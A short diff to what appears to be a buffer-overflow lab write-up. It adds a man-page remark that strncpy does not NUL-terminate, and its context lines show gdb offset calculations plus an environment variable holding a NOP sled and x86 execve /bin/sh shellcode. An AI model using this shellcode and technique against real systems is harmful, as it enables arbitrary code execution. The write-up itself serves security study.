@@ -92,10 +92,15 @@ b *pp+122
 buffer2
 (gdb) p/d 0xbffff6b0 - 0xbffff69c = 20
 ```
+about strncpy:
+the man says
+`Note that it does not NUL terminate chararray because the length of the source string is
+     greater than or equal to the length argument.`
+
 ```
 export shellcode=$(python -c 'print "\x90"*400 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 ```
-
+     
 pick a random addr as starting of shellcode
 ```
 (gdb) x/600wx $esp
